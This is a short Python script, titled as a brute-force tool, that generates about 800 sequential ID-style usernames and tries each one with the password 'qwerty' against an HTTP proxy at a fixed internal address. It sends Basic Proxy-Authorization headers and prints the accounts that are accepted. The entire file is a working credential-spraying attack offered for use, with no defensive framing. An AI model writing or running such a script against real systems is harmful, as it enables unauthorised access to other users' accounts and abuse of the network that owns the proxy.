#!/usr/bin/env python

import sys,os
import socket
import base64

count=2009001
passlst=[]

for i in range(2,800):    
    username="f"+str(count)
    passlst.append(username)
    count=count+1
    

print("Starting Brute....")
for password in passlst:
    username=password
    print username
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    connection.settimeout(50)
    connection.connect(("10.1.9.20",8080))
    connection.send("GET http://www.google.co.in/index.html HTTP/1.1\r\n")
    connection.send("Proxy-Authorization: Basic "+ base64.b64encode(username+":"+"qwerty") +"\r\n")
    connection.send("\r\n")
    response = connection.recv(1024)
    if "HTTP/1.0 200 OK" in response:
        print "---- match found" + "      "+username
    connection.close()
    count=count+1
